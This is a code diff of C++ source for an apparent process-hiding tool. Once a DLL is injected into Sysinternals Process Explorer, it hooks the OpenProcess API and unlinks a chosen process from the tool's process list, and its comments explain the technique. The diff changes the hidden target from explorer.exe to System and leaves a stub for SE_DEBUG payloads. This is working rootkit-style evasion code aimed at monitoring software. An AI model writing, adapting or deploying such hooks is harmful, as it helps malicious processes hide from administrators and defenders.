@@ -2,9 +2,9 @@
 #include "Procexp.h"
 
 
-Procexp::Procexp()
+Procexp::Procexp(std::wstring targetProcess)
 {
-
+//	myProcess = this->targetProcAddr;
 }
 
 void Procexp::DoActions()
@@ -17,7 +17,7 @@ void Procexp::DoActions()
 	{
 		//SE_DEBUG related payloads here
 	}
-		
+
 	RegisterHook(Procexp::HideProcessHook, L"kernel32.dll", "OpenProcess");
 }
 
@@ -46,8 +46,8 @@ void Procexp::Patch(void* hook, void* jmpAddr)
 //Once dll is injected, there are several ways to hide our process from Procexp. This method is ideal for working across multiple
 //versions of Procexp, since rather than patching offsets and specific functions that could change, we are patching 
 //OpenProcess API, which is repetetively called by procexp and leaves a pointer (r14 in x64) pointing to its linked list of processes
-//that is a structure less likely to be changed in a drastic way. Because of this, we must do as much validation to the r14 pointer
-//as possible to avoid dereferencing bad memory or other disasters.
+//that is a structure less likely to be changed in a problematic way. Because of this, we must do as much validation to the r14 pointer
+//as possible to avoid dereferencing bad memory from other cases OpenProcess is called.
 //
 HANDLE Procexp::HideProcessHook(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId, process_explorer_proc_obj* procObj)
 {
@@ -68,7 +68,7 @@ HANDLE Procexp::HideProcessHook(DWORD dwDesiredAccess, BOOL bInheritHandle, DWOR
 			{
 				process_explorer_proc_obj* next = (process_explorer_proc_obj*)((DWORD64)procObj + procObj->flink_offset);
 				std::wstring targetProcName = (wchar_t*)(next->proc_name);
-				if (targetProcName == L"explorer.exe")
+				if (targetProcName == L"System")
 				{
 					//Skip link that has our target process to hide
 					procObj->flink_offset += (DWORD)next->flink_offset;
